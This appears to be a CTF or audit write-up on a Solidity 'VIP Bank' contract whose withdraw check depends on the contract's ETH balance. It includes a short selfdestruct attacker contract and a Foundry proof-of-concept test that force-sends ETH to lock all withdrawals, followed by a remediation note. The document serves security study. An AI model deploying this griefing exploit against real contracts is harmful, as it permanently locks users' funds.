## VIP Bank

### Vulnerability Analysis
Given contracts allows VIP users to withdraw their funds using `withdraw` function. In this function some validity checks performed.

The first condition `require(address(this).balance <= maxETH)` relies on the native(ETH) balance of the contract.
In some cases, the logic relying on native ETH balance is vulnerable to DOS(griefing) attacks,
because even if the contract doesn't specify a receive ether(or payable fallback) function, it's still possible to
forcibly send ether to the contract, e.g. via `selfdestruct`.

In this case the logic in condition is vulnerable, because it checks whether the current balance **less** or equal 0.5 ETH.
So if we manage to increase the contract's balance to exceed this value, the mentioned condition in `withdraw` function
will never pass, and all user funds will be locked forever.

### Attack Steps
1. Deploy a contract with `selfdestruct` functionality and some ETH balance (enough to exceed `maxETH`)
2. Call the function with `selfdestruct`

### POC

attacker contract - `VIP_BankAttack.sol`
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract VIP_BankAttack {
  function attack(address payable _target) external payable {
    selfdestruct(_target);
  }
}

```

forge(foundry) test:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "./VIP_Bank.sol";
import "./VIP_BankAttack.sol";

contract VIP_BankPOC is Test {
  VIP_Bank target;
  address vipClient;

  function setUp() external {
    target = new VIP_Bank();

    // Create VIP client
    vipClient = makeAddr("vip");
    vm.deal(vipClient, 1 ether);
    target.addVIP(vipClient);

    require(target.VIP(vipClient), "POC: not a vip client");

    // VIP client deposit some ether
    vm.prank(vipClient);
    target.deposit{ value: 0.05 ether }();

    require(target.balances(vipClient) == 0.05 ether, "POC: vip incorrect balance");
  }

  // Confirm the emulated environment works as expected
  function testSuccessWithdraw() external {
    vm.prank(vipClient);
    target.withdraw(0.05 ether);
  }

  function testExploit() external {
    VIP_BankAttack attacker = new VIP_BankAttack();
    attacker.attack{ value: 0.6 ether }(payable(address(target)));

    vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction");
    vm.prank(vipClient);

    target.withdraw(0.05 ether);
  }
}
```

Command: `forge test --mc VIP_BankPOC`

### Remediation
When possible, contracts should avoid relying on the native ETH balance, since it can be manipulated.
Custom accounting logic(e.g. via dedicated variable) can be used instead of native ETH balances.
